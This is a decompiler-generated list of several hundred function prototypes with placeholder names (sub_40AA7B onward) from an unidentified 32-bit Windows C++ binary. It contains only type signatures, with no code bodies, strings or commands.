_QWORD *__cdecl sub_40AA7B(_QWORD *a1, _QWORD *a2);
bool __cdecl sub_40AA98(int a1, int a2, _DWORD *a3);
int __cdecl sub_40AAC1(void *Src, int a2, void *a3); // idb
int __thiscall sub_40AAE3(int this, char *Src);
std::exception *__thiscall sub_40AB10(std::exception *this, struct std::exception *a2);
_DWORD *__thiscall sub_40AB31(_DWORD *this);
_DWORD *__thiscall sub_40AB80(_DWORD *this, int a2, char a3);
int __thiscall sub_40ABBB(int this, int a2, char a3);
_DWORD *__thiscall sub_40ABF2(_DWORD *this, int a2);
_DWORD *__thiscall sub_40AC29(_DWORD *this, int a2);
int __thiscall sub_40AC76(_BYTE *this);
void __thiscall sub_40ACD8(int this);
_BYTE *__thiscall sub_40AD5E(char *this, char a2);
void *__thiscall sub_40AD66(char *this, char a2);
void *__thiscall sub_40AD6E(char *this, char a2);
_DWORD *__thiscall sub_40AD76(_DWORD *Block, char a2);
_BYTE *__thiscall sub_40AD95(_BYTE *Block, char a2);
void *__thiscall sub_40ADB4(void *Block, char a2);
_DWORD *__thiscall sub_40ADD3(_DWORD *Block, char a2);
void *__thiscall sub_40ADFB(void *Block, char a2);
bool __thiscall sub_40AE15(_DWORD *this);
unsigned int __thiscall sub_40AE24(_DWORD *this, int a2);
int __thiscall sub_40AEE3(int *this, int a2);
int __thiscall sub_40B008(void *this, int a2);
void __stdcall __noreturn sub_40B054(_DWORD, _DWORD); // weak
char __cdecl sub_40B07B(int a1);
char __cdecl sub_40B0B9(int a1, _DWORD *a2);
char __cdecl sub_40B104(int a1, int *a2, _BYTE *a3);
_DWORD __stdcall sub_40B1AB(char); // weak
int __thiscall sub_40B1D0(int this, int a2, int a3, __int64 a4, int a5, int a6);
__int64 __thiscall sub_40B21E(void *this, int a2, __int64 a3, __int64 a4, int a5);
void __thiscall sub_40B269(_DWORD *this, int *a2);
void __thiscall sub_40B32D(int *this, int a2);
int __cdecl sub_40B450(int *a1);
int __cdecl sub_40B487(int *a1, unsigned __int64 a2);
int __cdecl sub_40B537(int a1, _DWORD *a2);
int __cdecl sub_40B586(int *a1, unsigned int a2);
char __thiscall sub_40B607(int this);
char __thiscall sub_40B646(int this, char a2);
__int64 __thiscall sub_40B69C(int this);
int __thiscall sub_40B6AF(int this);
int __thiscall sub_40B6EB(int this);
_DWORD __stdcall sub_40B758(_DWORD, _DWORD); // weak
int __thiscall sub_40B78F(int this, int a2, unsigned int *a3, int a4, int a5);
_DWORD *__cdecl sub_40B7DF(unsigned int a1, unsigned int a2, char a3);
unsigned int __thiscall sub_40B83F(_DWORD *this, unsigned int a2);
void __thiscall sub_40B856(const void **this, int a2, size_t Size);
// void __cdecl std::_Deallocate(void *, unsigned int, unsigned int); idb
bool __thiscall sub_40B998(const void **this, size_t Size, char a3);
unsigned int __thiscall sub_40B9F6(_DWORD *this, unsigned int a2);
bool __fastcall sub_40BA21(_DWORD *a1, int a2, unsigned int a3);
_DWORD *__thiscall sub_40BA59(int this, unsigned int a2);
unsigned int __thiscall sub_40BAB4(_DWORD *this, unsigned int a2);
void __thiscall sub_40BAFC(_DWORD *this, char a2, size_t Size);
int __thiscall sub_40BB4F(int this);
void **__thiscall sub_40BB78(void **this, void **a2, unsigned int a3, unsigned int a4);
void **__fastcall sub_40BC05(void **a1, int a2, _BYTE *Src, size_t Size);
unsigned int __cdecl sub_40BC7D(const char *a1);
unsigned int __thiscall sub_40BC96(_DWORD *this, unsigned int *a2);
void *__thiscall sub_40BCE8(int this, size_t Size);
int __thiscall sub_40BD11(_DWORD *this, unsigned int a2);
_DWORD *__thiscall sub_40BD6F(_DWORD *this);
void *__thiscall sub_40BD87(void *Block, char a2);
int __stdcall sub_40BDA1(int a1);
int __stdcall sub_40BDBF(_DWORD *a1);
char __cdecl sub_40BDCB(unsigned int a1, unsigned int a2);
int __thiscall sub_40BE0E(void *this);
char __thiscall sub_40BE18(int *this, int a2, unsigned int a3);
char __thiscall sub_40BE49(_DWORD *this, unsigned int a2, unsigned int a3);
int __cdecl sub_40BEFB(int a1, _BYTE **a2, char *Src);
_DWORD *__cdecl sub_40BF28(_DWORD *Src, char Val, _DWORD *a3);
_DWORD *__cdecl sub_40BF8D(_DWORD *a1, int a2, unsigned int a3);
int __cdecl sub_40C058(_DWORD *a1, _DWORD *a2);
_DWORD *__thiscall sub_40C08D(_DWORD *this, int a2, int a3);
void __thiscall sub_40C0C0(_DWORD *this);
int __thiscall sub_40C0DC(_DWORD *this);
// int __thiscall unknown_libname_21(void *, void *Src); idb
char *__thiscall sub_40C174(char *this, char a2);
_DWORD *__thiscall sub_40C1B3(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40C1DB(_DWORD *Block, char a2);
int __thiscall sub_40C1FA(_DWORD **this, int a2);
int __thiscall sub_40C216(_DWORD **this);
void __thiscall sub_40C21E(_DWORD *this, int a2, int a3, unsigned int a4, int a5, int a6);
int __cdecl sub_40C483(int a1, int a2, int a3, int a4, int a5, int a6, int a7, char a8, unsigned int a9);
int __thiscall sub_40C5A0(_DWORD *this, _DWORD *Src);
const void **__thiscall sub_40C5F5(const void **this, _DWORD *a2, unsigned int a3, unsigned int a4);
const void **__fastcall sub_40C68E(_BYTE **a1, int a2, _BYTE *Src, size_t Size);
const void **__thiscall sub_40C72A(const void **this, unsigned int a2, const void **a3, unsigned int a4, unsigned int a5);
_DWORD *__cdecl sub_40C853(_DWORD *a1, _DWORD *a2, char *Src);
int __cdecl sub_40C8C7(int a1, char *Src, _BYTE **a3);
_DWORD *__cdecl sub_40C8F6(_DWORD *a1, char *Src, _DWORD *a3);
int __cdecl sub_40C96A(int a1, unsigned int a2);
_DWORD *__cdecl sub_40C983(_DWORD *a1, int a2, unsigned int a3);
int __thiscall sub_40CA94(int this, unsigned int a2);
void *__thiscall sub_40CAC3(void *this, char a2);
std::exception *__thiscall sub_40CB81(std::exception *this, struct std::exception *a2);
std::exception *__thiscall sub_40CBA2(std::exception *this, struct std::exception *a2);
_DWORD *__thiscall sub_40CBC3(_DWORD *this, _DWORD *a2, int a3);
std::exception *__thiscall sub_40CC70(std::exception *this, struct std::exception *a2);
_DWORD *__thiscall sub_40CC91(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_40CCE7(_DWORD *this, int a2, int a3, int a4, int a5);
std::exception *__thiscall sub_40CD50(std::exception *this, struct std::exception *a2);
char __thiscall sub_40CD76(int this);
int __thiscall sub_40CD9A(_DWORD *this);
char *__thiscall sub_40CDB6(char *this, char a2);
void *__thiscall sub_40CDE0(void *Block, char a2);
_DWORD *__thiscall sub_40CDFA(_DWORD *Block, char a2);
unsigned int __thiscall sub_40CE19(void *this, unsigned int a2, unsigned int a3, unsigned int a4, unsigned int a5, char a6);
int __stdcall sub_40CF0E(int a1);
int __stdcall sub_40CF2C(int a1);
char __thiscall sub_40CF4A(int *this);
char __thiscall sub_40CF75(int *this);
int __thiscall sub_40CFAC(void *this, int a2);
int __thiscall sub_40CFFD(int *this, int a2, int a3);
int __thiscall sub_40D046(int *this, int a2, int a3, int a4, int a5);
BOOL __thiscall sub_40D094(void *this, int a2, int a3, int a4);
int __thiscall sub_40D0C5(int *this, int a2, int a3, int a4);
int __thiscall sub_40D110(int *this, int a2, int a3, int a4, int a5, int a6);
int __thiscall sub_40D162(int *this, int a2, int a3, int a4, int a5, int a6);
int __thiscall sub_40D18C(_DWORD *this, int a2, unsigned int a3, int a4, int a5);
int __thiscall sub_40D1B6(void *this, int a2, int a3, int a4);
_DWORD *__thiscall sub_40D1EE(void *this, int a2, int a3, int a4);
int __thiscall sub_40D229(int *this, int a2);
int __thiscall sub_40D24A(void *this, int a2, int a3, int a4);
int __thiscall sub_40D25A(void *this);
void __noreturn sub_40D263(); // weak
int __thiscall sub_40D2A4(int *this, int a2, int a3);
char __fastcall sub_40D2F2(int a1);
// char __userpurge sub_40D308@<al>(int a1@<ecx>, _DWORD *a2@<ebx>, int a3@<ebp>, int a4, int a5, int a6, int a7);
int __thiscall sub_40D3B4(void *this, int a2, int a3);
int __thiscall sub_40D400(int *this, int a2);
int __thiscall sub_40D42E(int *this, int a2, int a3);
int __thiscall sub_40D4AE(void *this, int *a2, int *a3);
int __thiscall sub_40D581(_DWORD *this);
int __thiscall sub_40D59B(void *this, int *a2, int a3);
char __thiscall sub_40D5B7(void *this);
int __thiscall sub_40D5E1(_DWORD *this, int a2, int a3);
int __thiscall sub_40D5FB(int *this, _WORD *a2, int a3);
void __noreturn sub_40D61D(); // weak
int __thiscall sub_40D65E(void *this, int a2, int a3);
void __noreturn sub_40D66A(); // weak
int __thiscall sub_40D6AB(void *this);
int __thiscall sub_40D6E8(void *this, int a2, int a3);
int *sub_40D6F4();
int __thiscall sub_40D767(void *this);
int __thiscall sub_40D79E(int *this, int a2);
int __thiscall sub_40D7CC(void *this, int a2, int a3);
int __thiscall sub_40D842(int *this, _WORD *a2, int a3);
int __thiscall sub_40D891(void *this, int a2, int a3, int a4, int a5);
int __stdcall sub_40D918(int a1, int a2, int a3, int a4);
int __thiscall sub_40D91D(int this, int a2, int a3, int a4, int a5);
int __thiscall sub_40DA3B(_DWORD *this, unsigned int a2, int a3, int a4);
int __thiscall sub_40DA54(void *this, int a2, int a3, int a4);
void __thiscall sub_40DA77(int *this, int a2, int a3, void *Src, int Size);
int __thiscall sub_40DADE(void *this, int a2);
int __thiscall sub_40DB06(void *this, int a2, int a3);
int __thiscall sub_40DB64(void *this);
int __thiscall sub_40DBA3(int *this, int a2);
void ***sub_40DBEE();
void __thiscall sub_40DC48(void *this, int a2);
int __thiscall sub_40DCBA(int *this, int a2);
int __thiscall sub_40DE8C(void *this, int a2);
unsigned int __thiscall sub_40DEDE(int *this, unsigned int a2);
int __thiscall sub_40DFA7(void *this);
int __thiscall sub_40E011(int *this);
int __thiscall sub_40E036(int *this, void *a2, int a3, int a4);
int __thiscall sub_40E0AB(int *this, void *a2, unsigned int *a3, int a4, int a5);
bool __thiscall sub_40E146(int *this, int a2, size_t Size);
_BYTE *__thiscall sub_40E19D(_BYTE *this, unsigned int a2, int a3);
char __thiscall sub_40E1C0(_BYTE *this, _BYTE *a2, unsigned int a3);
const void **__fastcall sub_40E1DC(_BYTE **a1, int a2, int a3, _BYTE *Src, size_t Size);
BOOL __fastcall sub_40E2D2(int a1, int a2, int a3, int a4);
BOOL __fastcall sub_40E335(int a1, int a2, int a3, int a4);
unsigned int __cdecl sub_40E398(_DWORD *a1);
int *__cdecl sub_40E3CF(int *a1, unsigned int *a2, unsigned int *a3, unsigned int *a4, unsigned int *a5);
int __cdecl sub_40E43F(unsigned int *a1, unsigned int a2, unsigned int a3);
void *__cdecl sub_40E4FF(int a1, void *Source, unsigned int a3, unsigned int a4, char a5);
_DWORD *__cdecl sub_40E56F(_DWORD *a1, int a2, int a3, int a4, int a5, int a6);
_BYTE *__cdecl sub_40E59E(int a1, int a2, _BYTE *a3);
void __cdecl sub_40E5BB(_DWORD *a1, int a2, _DWORD *a3);
_DWORD *__cdecl sub_40E5DE(_DWORD *a1, int a2, int a3, int a4, int a5, int a6);
_DWORD *__thiscall sub_40E618(_DWORD *this);
_DWORD *__thiscall sub_40E637(_DWORD *this);
_DWORD *__thiscall sub_40E667(_DWORD *this, int a2);
_DWORD *__thiscall sub_40E6B1(_DWORD *this, unsigned int a2);
_DWORD *__thiscall sub_40E6D3(_DWORD *this, unsigned int a2);
_DWORD *__thiscall sub_40E6F5(_DWORD *this, int a2, unsigned int a3, unsigned int a4);
int __thiscall sub_40E718(int this, int a2);
std::exception *__thiscall sub_40E755(std::exception *this, struct std::exception *a2);
_DWORD *__thiscall sub_40E776(_DWORD *this);
_DWORD *__thiscall sub_40E7BF(_DWORD *this, int a2, unsigned int a3);
void *__thiscall sub_40E80A(void *this, int *a2);
_DWORD *__thiscall sub_40E85C(_DWORD *this, int a2);
void *__thiscall sub_40E8A1(_DWORD *this, void *Src, size_t Size, int a4, int a5);
void __thiscall sub_40E940(_DWORD *this);
_DWORD *__thiscall sub_40E96D(_DWORD *this, int a2);
_DWORD *__thiscall sub_40E9C4(_DWORD *this, int a2);
_DWORD *__thiscall sub_40EA18(_DWORD *this, int a2);
int __thiscall sub_40EA62(int this, int a2);
_DWORD *__thiscall sub_40EB0B(_DWORD *this, int a2);
_DWORD *__thiscall sub_40EB3C(_DWORD *this, void *Src, int Size);
void __thiscall sub_40EBD5(_DWORD *this);
void __thiscall sub_40EC29(_DWORD *this);
void __thiscall sub_40EC4B(_DWORD *this);
int __thiscall sub_40EC6C(int this, int *a2);
void *__thiscall sub_40ECC6(int *this, void *a2, unsigned int a3);
char __thiscall sub_40ED09(int *this);
int *__cdecl sub_40ED2F(int *a1, void *a2, int a3);
_DWORD *__thiscall sub_40ED4C(_DWORD *this);
_DWORD *__cdecl sub_40EDC8(_DWORD *a1, _DWORD *a2, int a3);
void *__thiscall sub_40EDE5(int *this, void *a2);
_DWORD *__cdecl sub_40EE07(_DWORD *a1, _DWORD *a2, unsigned int a3);
_DWORD *__cdecl sub_40EE24(_DWORD *a1, int a2, int a3);
int *__cdecl sub_40EE85(int *a1, int *a2, int *a3);
int *__cdecl sub_40EEA2(int *a1, int *a2, int *a3);
_DWORD *sub_40EEBF();
_DWORD *sub_40EEEE();
_DWORD *__thiscall sub_40EF1C(_DWORD *this, int a2);
_DWORD *__thiscall sub_40EF6C(_DWORD *this, int a2);
int *__thiscall sub_40EFBC(int *this, unsigned int a2);
int *__thiscall sub_40F028(int *this, unsigned int a2);
void *__thiscall sub_40F092(void *Block, char a2);
void *__thiscall sub_40F0BC(void *Block, char a2);
_DWORD *__thiscall sub_40F0DE(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40F0FD(_DWORD *Block, char a2);
_DWORD *__thiscall sub_40F11C(int *this, _DWORD *a2);
_DWORD *__stdcall sub_40F13D(_DWORD *a1, int a2);
int *__thiscall sub_40F14D(_DWORD *this, int *a2, int a3);
int __thiscall sub_40F1C7(_DWORD **this, int a2, int a3);
int __thiscall sub_40F1E4(void *this, _DWORD *a2, unsigned int a3);
int *__thiscall sub_40F225(int *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_40F2D0(_DWORD **this);
char *__cdecl sub_40F2D8(void *a1, char *a2, void *Source, int a4, void *a5, int a6);
char __cdecl sub_40F4DF(char *a1, int a2, int *a3);
int __cdecl sub_40F52D(unsigned int *Destination, int a2, unsigned int *Source, unsigned int a4, unsigned int *a5, unsigned int a6);
int __thiscall sub_40F7F8(void *this, int a2);
unsigned __int64 __cdecl sub_40F864(int a1, unsigned int *a2, unsigned int *a3);
unsigned __int64 __cdecl sub_40F8C7(_DWORD *a1, unsigned int *a2, unsigned int *a3);
unsigned __int64 __cdecl sub_40FA2E(_DWORD *a1, unsigned int *a2, unsigned int *a3);
int __cdecl sub_40FFAD(_DWORD *a1, unsigned int *a2, unsigned int *a3);
int __cdecl sub_40FFD9(_DWORD *a1, unsigned int *a2, unsigned int *a3);
int __cdecl sub_410085(_DWORD *a1, unsigned int *a2, unsigned int *a3);
int __cdecl sub_41034B(_DWORD *a1, unsigned int *a2, unsigned int *a3);
unsigned __int64 __cdecl sub_410375(_DWORD *a1, unsigned int *a2, unsigned int *a3, unsigned int a4);
unsigned __int64 __cdecl sub_410497(_DWORD *a1, unsigned int *a2, unsigned int *a3, unsigned int a4);
_DWORD *__cdecl sub_41083F(_DWORD *a1, unsigned int *a2);
_DWORD *__cdecl sub_4108A7(_DWORD *a1, unsigned int *a2);
_DWORD *__cdecl sub_410A44(_DWORD *a1, unsigned int *a2);
unsigned int __thiscall sub_410F9E(int *this);
unsigned int __thiscall sub_410FD0(int *this);
void *__thiscall sub_411000(_DWORD *this, void *a2, int *a3, int *a4, int *a5, int *a6);
int __thiscall sub_4110E5(void *this, int a2, void *a3, int *a4, int *a5, int *a6);
int __thiscall sub_41110A(_DWORD **this, int a2, int a3, int a4, int a5, int a6);
void __cdecl sub_411132(unsigned int a1);
void __thiscall sub_411181(int this, unsigned int a2);
void *__thiscall sub_4111C8(int this, int a2);
_DWORD *__thiscall sub_4111F9(void *this);
_DWORD *__thiscall sub_411229(void *this);
int __cdecl sub_411259(int a1, int a2, int a3);
int __thiscall sub_41128E(int *this, int a2);
int *__thiscall sub_4112C0(int *this, int *a2, int *a3);
int *__thiscall sub_4112E3(int *this, int *a2, int *a3);
void *__stdcall sub_41132F(void *a1, int *a2);
void *__thiscall sub_41134B(int *this, void *a2, int a3);
errno_t __cdecl sub_4113D1(void *Destination, void *Source, int a3);
int __cdecl sub_4113F2(int a1, int a2);
void __thiscall sub_411414(int *this, int a2);
unsigned int __thiscall sub_411463(int this, int a2, unsigned int a3, int a4);
unsigned int __thiscall sub_4115B0(void *this, void *Src, size_t Size, int a4);
int __cdecl sub_4115F5(unsigned int *a1, unsigned int a2, int a3);
int __thiscall sub_41162E(void *this, int *a2, int *a3);
int __cdecl sub_41166F(void *Destination, int a2, _DWORD *a3, void *a4, char *a5, _DWORD *Source, unsigned int a7);
char __cdecl sub_4118C4(int *a1, int *a2, int *a3, int *a4);
int __thiscall sub_41195B(int *this, int a2, int a3);
errno_t __cdecl sub_411977(_BYTE *Destination, void *Source, int a3, int a4, int a5);
int *__thiscall sub_4119DA(int *this, int *a2, int *a3);
char __stdcall sub_411A2F(int *a1, int *a2, int *a3, int *a4);
int __thiscall sub_411A4A(void *this, _DWORD *a2);
int __thiscall sub_411A85(void *this, int a2);
int __thiscall sub_411A95(_DWORD **this);
_DWORD *__thiscall sub_411A9D(_DWORD *this, _DWORD *a2);
void __thiscall sub_411AB7(int *this, int a2, unsigned int a3, unsigned int a4);
void __thiscall sub_411B5F(int *this, int a2, unsigned int a3, unsigned int a4);
bool __stdcall sub_411B98(int *a1, int a2);
int __thiscall sub_411BAE(_DWORD **this);
int __cdecl sub_411BB6(int a1, int a2);
void *__cdecl sub_411BDF(void *a1, int a2, int a3);
char __thiscall sub_411C2A(_DWORD *this, unsigned int a2);
char __thiscall sub_411C4F(_DWORD *this, unsigned int a2);
char sub_411C74();
int __thiscall sub_411C8D(_DWORD **this);
int __cdecl sub_411C95(unsigned int *a1, unsigned int a2, int a3);
int __thiscall sub_411CC4(void *this, int *a2);
int *__thiscall sub_411CFF(int this, int *a2);
int __thiscall sub_411D5D(_DWORD **this);
void *__thiscall sub_411D65(int this, void *a2, int a3);
char sub_411FD1();
char __stdcall sub_411FE5(int *a1);
char __thiscall sub_411FF1(int *this);
char __thiscall sub_412011(void *this, int a2);
unsigned int __thiscall sub_412045(int *this, int a2);
_DWORD *__thiscall sub_41210D(_DWORD *this, _DWORD *a2, unsigned int a3);
int __thiscall sub_412194(void *this, int *a2, int *a3);
int *__thiscall sub_4121D5(int *this, int *a2, int *a3);
int __thiscall sub_41222B(int *this, unsigned int a2);
errno_t __cdecl sub_4122FF(void *Destination, int a2, int a3, int a4, int a5, int a6);
int __thiscall sub_412375(int *this);
int __thiscall sub_4123CF(void *this, int *a2);
void *__thiscall sub_41240A(int *this, void *a2);
int __thiscall sub_412438(void *this, int a2);
_DWORD *__thiscall sub_412477(_DWORD *this, int a2);
int __thiscall sub_412510(void *this, void *a2, int a3);
char __cdecl sub_412551(int *a1, int a2, int a3);
int __thiscall sub_412587(int *this, void *a2, int a3);
_DWORD *__thiscall sub_4125E2(_DWORD *this, int a2, int a3);
errno_t __cdecl sub_41266E(void *Destination, void *Source, int a3, int a4, int a5);
int __cdecl sub_4126C7(int a1, int a2, int a3, int a4, int a5, unsigned int a6);
char __thiscall sub_4128A1(int *this);
void *__thiscall sub_4128B8(int this, int a2);
_DWORD *sub_4128E4();
_DWORD *__thiscall sub_4128F1(_DWORD *this, _DWORD *a2, unsigned int a3);
int __cdecl sub_412978(_DWORD *a1, int a2, int a3);
int __thiscall sub_412A4E(int *this, int a2);
void __cdecl sub_412A91(int a1, int a2, int *a3, int a4);
void __cdecl sub_412B99(int a1, int a2, int a3);
int __cdecl sub_412C28(int a1, int a2, int a3);
_DWORD *__cdecl sub_412D4C(_DWORD *a1, unsigned int a2);
int __cdecl sub_412D8F(int a1, unsigned int *a2, _DWORD *a3, unsigned int a4);
int __cdecl sub_412E84(int a1, int a2, int a3, int a4, unsigned int a5);
int __cdecl sub_41302C(int a1, int a2, int a3, int a4, unsigned int a5);
int __cdecl sub_4130D8(int a1, int a2, int a3, unsigned int a4);
_DWORD *__stdcall sub_413195(_DWORD *a1, int a2);
_DWORD *__thiscall sub_4131A5(_DWORD *this, _DWORD *a2, int a3);
int __thiscall sub_413204(_DWORD **this, int a2, int a3);
int __cdecl sub_413329(unsigned int a1);
int __fastcall sub_413372(int a1, int a2, int a3, int a4);
void __cdecl sub_413409(int a1, int a2, int a3);
int sub_4134C6();
int sub_413503();
int sub_413540();
int sub_41357D();
int sub_4135BA();
int sub_4135F7();
// __m128i __usercall sub_413634@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
void __cdecl sub_413EC9(int a1, int a2, int a3);
int sub_413F89();
int sub_413FC9();
int sub_414006();
int sub_414043();
int sub_414080();
int sub_4140BD();
int sub_4140FA();
int sub_414137();
int sub_414174();
int sub_4141B1();
int sub_4141EE();
int sub_41422B();
int sub_414268();
int sub_4142A5();
// __m128i __usercall sub_4142E2@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
void __cdecl sub_4154EC(int a1, int a2, int a3);
// __m128i __usercall sub_415591@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
void __cdecl sub_415754(int a1, int a2, int a3);
int sub_415808();
int sub_415845();
// __m128i __usercall sub_415882@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
int __cdecl sub_415C8B(int a1, int a2, int a3);
int sub_415D48();
int sub_415D85();
int sub_415DC2();
int sub_415DFF();
int sub_415E3C();
// __m128i __usercall sub_415E79@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
int __cdecl sub_416370(int a1, int a2, int a3);
int sub_416430();
int sub_41646D();
int sub_4164AA();
int sub_4164E7();
int sub_416524();
int sub_416561();
int sub_41659E();
int sub_4165DB();
int sub_416618();
int sub_416655();
int sub_416692();
int sub_4166CF();
int sub_41670C();
// __m128i __usercall sub_416749@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
int __cdecl sub_4171A7(int a1, int a2, int a3);
int __cdecl sub_4172F8(int a1, int a2, int a3);
int sub_4173A9();
// __m128i __usercall sub_4173E6@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
void __cdecl sub_41762B(int a1, int a2, int a3);
int sub_41774F();
int sub_41778C();
int sub_4177C9();
int sub_417806();
int sub_417843();
int sub_417880();
// __m128i __usercall sub_4178BD@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
void __cdecl sub_417DB5(int a1, int a2, int a3);
int sub_417F77();
int sub_417FB7();
int sub_417FF4();
int sub_418031();
int sub_41806E();
int sub_4180AB();
int sub_4180E8();
int sub_418125();
int sub_418162();
int sub_41819F();
int sub_4181DC();
int sub_418219();
int sub_418256();
int sub_418293();
// __m128i __usercall sub_4182D0@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
void __cdecl sub_418C54(int a1, int a2, int a3);
int sub_418D23();
int sub_418D60();
// __m128i __usercall sub_418D9D@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
int __cdecl sub_41904F(int a1, int a2);
int sub_4190E8();
int sub_419125();
// __m128i __usercall sub_419162@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
int __cdecl sub_419CBE(int a1, int a2);
int sub_419D5A();
int sub_419D9A();
int sub_419DD7();
int sub_419E14();
int sub_419E51();
int sub_419E8E();
// __m128i __usercall sub_419ECB@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
int __cdecl sub_41B744(int a1, int a2);
int __cdecl sub_41B966(int a1, int a2);
// __m128i __usercall sub_41B9F0@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>);
int __fastcall sub_41BEEC(int a1, int a2, int a3, int a4);
int __thiscall sub_41BF83(_DWORD **this, int a2, int a3, int a4);
void __thiscall sub_41BFA5(_DWORD *this, unsigned int a2, char a3);
char sub_41BFFE();
unsigned int __cdecl sub_41C142(int a1, unsigned int a2, int a3);
int __cdecl sub_41C187(_DWORD *a1, unsigned int a2, unsigned int a3);
int __cdecl sub_41C1C2(int a1, int a2, int a3);
int __cdecl sub_41C21A(_DWORD *a1, unsigned int a2, unsigned int a3);
void __thiscall sub_41C260(_DWORD *this, int a2, int *a3, int *a4, unsigned int a5);
int __thiscall sub_41C32D(_DWORD **this);
int __thiscall sub_41C335(void *this, void *a2);
int __thiscall sub_41C370(int *this, void *a2);
_DWORD *__thiscall sub_41C3C8(_DWORD *this, int a2);
int *__thiscall sub_41C444(void *this, int *a2);
int __thiscall sub_41C45E(void *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_41C49F(_DWORD *this, _DWORD *a2, int a3);
int __thiscall sub_41C52F(_DWORD **this);
int *__thiscall sub_41C537(void *this, int *a2, int a3);
unsigned int __cdecl sub_41C57A(unsigned int *a1, unsigned int a2);
int __thiscall sub_41C5A2(int *this);
_DWORD *sub_41C5B0();
char __thiscall sub_41C5BD(_DWORD *this, unsigned int a2);
char __thiscall sub_41C60B(_DWORD **this, unsigned int a2, _DWORD *a3);
_DWORD *__stdcall sub_41C658(_DWORD *a1, int a2, _DWORD *a3);
_DWORD *__cdecl sub_41C67D(_DWORD *a1, int a2, int a3, int a4);
int __stdcall sub_41C6BE(unsigned int a1, int a2);
void *__stdcall sub_41C6E2(unsigned int a1, int a2);
_DWORD *__cdecl sub_41C706(_DWORD *a1);
_DWORD *__cdecl sub_41C71F(_DWORD *a1);
_DWORD *__cdecl sub_41C767(_DWORD *a1);
// static errno_t __cdecl memcpy_s(void *const Destination, const rsize_t DestinationSize, const void *const Source, const rsize_t SourceSize);
_DWORD *__thiscall sub_41C829(_DWORD *this, char *a2, void (__thiscall *a3)(int, int *), int a4, int a5);
void *__thiscall sub_41C91C(void *this, char *Src, int (__thiscall *a3)(int), int a4, int a5);
int *__cdecl sub_41C9CF(int *a1, int a2, void *a3);
char __thiscall sub_41C9E5(void *this, int a2);
int *__thiscall sub_41CA66(int *this, int a2, void *a3);
void *__thiscall sub_41CAB1(void *this, int a2, _BYTE *Src, int a4, int *a5, int a6);
void *__thiscall sub_41CC5F(void *this, int a2);
_DWORD *__thiscall sub_41CC86(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_41CCCF(char *this, int a2);
int __thiscall sub_41CD3F(int this);
int __thiscall sub_41CE0F(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_41CE6D(_DWORD *this, int a2);
_DWORD *__stdcall sub_41CECB(_DWORD *a1);
char *__thiscall sub_41CEE5(char *this);
char __thiscall sub_41CEE9(void *this, void *Src, int a3, void *a4);
int __thiscall sub_41CF67(void *this, int *a2);
int __stdcall sub_41CF6F(int); // weak
bool __thiscall sub_41CF77(int *this, int a2, int a3);
_DWORD *__cdecl sub_41CFD4(_DWORD *a1);
_DWORD *__cdecl sub_41D017(_DWORD *a1);
_DWORD *__cdecl sub_41D05A(_DWORD *a1);
_DWORD *__cdecl sub_41D09D(_DWORD *a1);
void *__cdecl sub_41D0E5(int a1, void *Source, rsize_t a3, rsize_t DestinationSize, char a5);
void *__thiscall sub_41D163(int this, rsize_t DestinationSize);
void *__thiscall sub_41D18C(int this, int a2, int a3, unsigned int a4);
void *__thiscall sub_41D1F1(_DWORD *this);
void *__thiscall sub_41D206(_DWORD *this);
int __thiscall sub_41D21F(_DWORD **this, int a2, int a3, int *a4);
int __thiscall sub_41D267(int this, int a2, _DWORD *a3, char a4);
char __thiscall sub_41D2E4(void *this, int a2, char a3);
char *__cdecl sub_41D30E(char *a1, int a2, _DWORD *a3, char a4);
int __cdecl sub_41D354(unsigned int *a1, _QWORD *a2);
_BYTE *__cdecl sub_41D36F(_BYTE *a1, _BYTE *a2, _BYTE **a3);
_DWORD *__thiscall sub_41D38F(_DWORD *this, int a2);
std::exception *__thiscall sub_41D3B9(std::exception *this, struct std::exception *a2);
_DWORD *__thiscall sub_41D3DA(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_41D430(_DWORD *this, int a2);
int __thiscall sub_41D458(int this, int a2);
int __thiscall sub_41D4A7(int this, int a2, int a3, char a4, int a5, _DWORD *Src, _DWORD *a7);
int __thiscall sub_41D546(int this, int a2, int a3, int a4);
int __thiscall sub_41D672(_DWORD *this);
int __thiscall sub_41D693(_DWORD *this);
_DWORD *__thiscall sub_41D6C1(_DWORD *this, _DWORD ***a2);
char *__thiscall sub_41D6DE(_DWORD *this, char a2);
_DWORD *__thiscall sub_41D754(_DWORD *Block, char a2);
int __thiscall sub_41D773(_DWORD **this, int a2);
char __thiscall sub_41D78F(int *this, void *Src, char *a3, int *a4);
int __thiscall sub_41D7E0(_DWORD *this);
int __thiscall sub_41D7FD(void *this, int a2, int a3, int a4, int a5, int a6, int a7);
int __thiscall sub_41D828(_DWORD *this, int a2, _QWORD *a3, __int64 a4, int a5, int a6);
int __thiscall sub_41D8A8(_DWORD *this, int *a2);
int __thiscall sub_41D8CB(_DWORD *this, int a2);
char __thiscall sub_41D8D3(_BYTE *this);
int __thiscall sub_41D8D7(int *this, int a2);
bool __thiscall sub_41D908(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_41D950(_DWORD *this);
int __thiscall sub_41D9B0(int this, int Size);
int __thiscall sub_41DA05(_DWORD *this);
int __thiscall sub_41DA3D(_DWORD *this);
int __thiscall sub_41DA41(_DWORD *this, int *a2);
int __thiscall sub_41DA9B(_DWORD *this);
int __thiscall sub_41DA9F(_DWORD *this);
char __thiscall sub_41DAA3(_BYTE *this);
